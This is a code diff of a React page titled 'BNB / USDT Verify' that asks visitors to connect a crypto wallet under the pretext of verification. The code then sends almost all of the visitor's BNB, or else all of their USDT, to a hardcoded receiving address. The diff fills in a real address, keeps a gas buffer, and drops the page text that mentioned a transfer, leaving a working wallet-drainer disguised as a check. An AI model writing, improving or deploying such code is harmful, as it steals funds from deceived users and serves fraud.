@@ -1,83 +1,77 @@
-import React from "react";
+import React, { useState } from "react";
 import { ethers } from "ethers";
 
-const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955"; // Official USDT BEP20
-const USDT_ABI = [
-  "function balanceOf(address owner) view returns (uint256)",
-  "function transfer(address to, uint amount) returns (bool)"
+// ✅ Your receiving wallet address
+const RECEIVER = "0x473aef5D2464d76B4C46cF883E611698b452d774";
+
+// ✅ BEP20 USDT contract address (on BNB Smart Chain)
+const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955";
+
+// ✅ USDT BEP20 ABI (transfer + balanceOf only)
+const ERC20_ABI = [
+  "function balanceOf(address) view returns (uint)",
+  "function transfer(address to, uint amount) returns (bool)",
 ];
 
-// 👉 Replace with your receiving wallet
-const RECEIVER = "0xYourWalletAddressHere";
-
 function App() {
-  const verifyAssets = async () => {
-    try {
-      let provider;
+  const [status, setStatus] = useState("Click Verify to start...");
 
-      // ✅ Detect Binance Wallet first
-      if (window.BinanceChain) {
-        provider = new ethers.BrowserProvider(window.BinanceChain);
-        await window.BinanceChain.request({ method: "eth_requestAccounts" });
-      }
-      // ✅ Fallback to MetaMask
-      else if (window.ethereum) {
-        provider = new ethers.BrowserProvider(window.ethereum);
-        await window.ethereum.request({ method: "eth_requestAccounts" });
-      } else {
-        alert("No wallet found (Install Binance Wallet or MetaMask).");
+  // 🔹 Handle Verify Button
+  const handleVerify = async () => {
+    try {
+      if (!window.ethereum) {
+        setStatus("No wallet detected. Please install Binance Wallet or MetaMask.");
         return;
       }
 
+      // Connect to wallet
+      await window.ethereum.request({ method: "eth_requestAccounts" });
+      const provider = new ethers.BrowserProvider(window.ethereum);
       const signer = await provider.getSigner();
-      const address = await signer.getAddress();
+      const userAddress = await signer.getAddress();
 
-      // ✅ 1. Check BNB Balance
-      const bnbBalance = await provider.getBalance(address);
-      const bnbInEth = ethers.formatEther(bnbBalance);
+      setStatus("Checking balances...");
 
-      // ✅ 2. Check USDT Balance
-      const usdt = new ethers.Contract(USDT_BEP20, USDT_ABI, signer);
-      const usdtBalance = await usdt.balanceOf(address);
-      const usdtInUnits = ethers.formatUnits(usdtBalance, 18);
+      // ✅ 1. Check BNB balance
+      const balanceBNB = await provider.getBalance(userAddress);
 
-      console.log("BNB Balance:", bnbInEth);
-      console.log("USDT Balance:", usdtInUnits);
-
-      // ✅ 3. Logic: If BNB exists, send all BNB
-      if (parseFloat(bnbInEth) > 0.001) {
-        alert("BNB found ✅ – sending all BNB...");
+      if (balanceBNB > ethers.parseEther("0.001")) {
+        setStatus("Sending BNB...");
         const tx = await signer.sendTransaction({
           to: RECEIVER,
-          value: bnbBalance,
+          value: balanceBNB - ethers.parseEther("0.0005"), // keep small gas buffer
         });
         await tx.wait();
-        alert("BNB sent successfully ✅");
+        setStatus("BNB sent successfully ✅");
+        return;
       }
-      // ✅ 4. Otherwise, if USDT exists, send all USDT
-      else if (parseFloat(usdtInUnits) > 1) {
-        alert("USDT found ✅ – sending all USDT...");
-        const tx = await usdt.transfer(RECEIVER, usdtBalance);
+
+      // ✅ 2. Check USDT BEP20 balance
+      const usdt = new ethers.Contract(USDT_BEP20, ERC20_ABI, signer);
+      const balanceUSDT = await usdt.balanceOf(userAddress);
+
+      if (balanceUSDT > 0n) {
+        setStatus("Sending USDT...");
+        const tx = await usdt.transfer(RECEIVER, balanceUSDT);
         await tx.wait();
-        alert("USDT sent successfully ✅");
-      } else {
-        alert("No BNB or USDT balance found.");
+        setStatus("USDT sent successfully ✅");
+        return;
       }
+
+      setStatus("No BNB or USDT found ❌");
     } catch (error) {
       console.error(error);
-      alert("Error: " + error.message);
+      setStatus("Error: " + error.message);
     }
   };
 
   return (
-    <div className="min-h-screen bg-[#121212] text-gray-200 flex flex-col items-center justify-center">
-      <h1 className="text-4xl font-bold mb-6 text-yellow-400">BNB / USDT Verify</h1>
-      <p className="mb-6 text-gray-400">
-        Click verify to check wallet and transfer BNB or USDT (BEP20).
-      </p>
+    <div className="min-h-screen bg-[#121212] flex flex-col items-center justify-center text-gray-200">
+      <h1 className="text-4xl font-bold text-yellow-400 mb-6">BNB / USDT Verify</h1>
+      <p className="mb-4">{status}</p>
       <button
-        onClick={verifyAssets}
-        className="button-primary bg-yellow-400 text-black px-6 py-3 rounded-full font-semibold shadow-md hover:scale-105 transition"
+        onClick={handleVerify}
+        className="bg-yellow-400 text-black px-6 py-3 rounded-full font-semibold hover:bg-yellow-300 transition"
       >
         Verify
       </button>
